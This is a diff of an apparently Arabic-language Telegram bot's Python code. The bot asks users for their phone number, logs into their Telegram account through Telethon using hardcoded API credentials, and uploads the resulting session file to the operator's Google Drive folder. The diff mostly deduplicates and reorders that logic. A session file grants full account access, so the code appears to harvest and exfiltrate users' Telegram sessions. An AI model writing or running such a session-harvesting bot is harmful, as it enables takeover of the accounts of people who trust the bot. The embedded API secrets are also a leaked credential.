@@ -97,25 +97,22 @@ async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text("أدخل رقم الهاتف الخاص بك مع رمز الدولة (مثل: +201234567890):")
     return PHONE
 
-
 async def process_phone(update, context):
+    # إعداد المتغيرات
     user_id = update.message.from_user.id
     phone_number = update.message.text.strip()
-
-    # إعداد بيانات ملف الجلسة
     session_file = f"/tmp/session_{user_id}.session"
     api_id = 26466946
     api_hash = '05d7144ca3c5f4594e40c535afb3bd5a'
-
-    print(f"مسار ملف الجلسة: {session_file}")
-    print(f"رقم المستخدم: {user_id}, رقم الهاتف: {phone_number}")
-
-    # بيانات ملف الجلسة على Google Drive
+    
     file_metadata = {
         'name': f'session_{user_id}.session',
         'parents': [FOLDER_ID],
         'mimeType': 'application/octet-stream'
     }
+
+    print(f"مسار ملف الجلسة: {session_file}")
+    print(f"رقم المستخدم: {user_id}, رقم الهاتف: {phone_number}")
 
     # التحقق من الجلسة المحلية وحذفها إذا كانت تالفة
     if os.path.exists(session_file):
@@ -132,7 +129,6 @@ async def process_phone(update, context):
             print(f"خطأ أثناء التحقق من الجلسة المحلية: {e}")
             os.remove(session_file)
             try:
-                # حذف الجلسة من Google Drive
                 query = f"name='{file_metadata['name']}' and '{FOLDER_ID}' in parents"
                 response = drive_service.files().list(q=query, fields="files(id)").execute()
                 if response['files']:
@@ -141,25 +137,6 @@ async def process_phone(update, context):
                     print(f"تم حذف الجلسة التالفة من Google Drive: File ID: {file_id}")
             except Exception as drive_error:
                 print(f"خطأ أثناء حذف الجلسة من Google Drive: {drive_error}")
-
-async def process_phone(update, context):
-    user_id = update.message.from_user.id
-    phone_number = update.message.text.strip()
-
-    # إعداد بيانات ملف الجلسة
-    session_file = f"/tmp/session_{user_id}.session"
-    api_id = 26466946
-    api_hash = '05d7144ca3c5f4594e40c535afb3bd5a'
-
-    print(f"مسار ملف الجلسة: {session_file}")
-    print(f"رقم المستخدم: {user_id}, رقم الهاتف: {phone_number}")
-
-    # بيانات ملف الجلسة على Google Drive
-    file_metadata = {
-        'name': f'session_{user_id}.session',
-        'parents': [FOLDER_ID],
-        'mimeType': 'application/octet-stream'
-    }
 
     # إنشاء جلسة جديدة
     client = TelegramClient(session_file, api_id, api_hash)
@@ -173,17 +150,13 @@ async def process_phone(update, context):
             print("المستخدم مصرح له مسبقًا.")
             # رفع الجلسة إلى Google Drive
             try:
-                print(f"التحقق من وجود ملف الجلسة محليًا: {os.path.exists(session_file)}")
                 if not os.path.exists(session_file):
                     print("خطأ: ملف الجلسة غير موجود محليًا قبل الرفع.")
                     await update.message.reply_text("خطأ: ملف الجلسة غير موجود محليًا قبل الرفع.")
-                    return
-
-                print(f"بيانات الملف قبل الرفع: {file_metadata}")
-                upload_media = MediaFileUpload(session_file, resumable=True)
-                print("تم إنشاء MediaFileUpload.")
+                    return PHONE
 
                 print("بدء عملية الرفع إلى Google Drive...")
+                upload_media = MediaFileUpload(session_file, resumable=True)
                 uploaded_file = drive_service.files().create(
                     body=file_metadata,
                     media_body=upload_media,
@@ -208,6 +181,9 @@ async def process_phone(update, context):
         print(f"حدث خطأ أثناء إنشاء الجلسة: {e}")
         await update.message.reply_text(f"حدث خطأ أثناء إنشاء الجلسة: {e}")
         return PHONE
+
+
+
 
 async def process_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.message.from_user.id
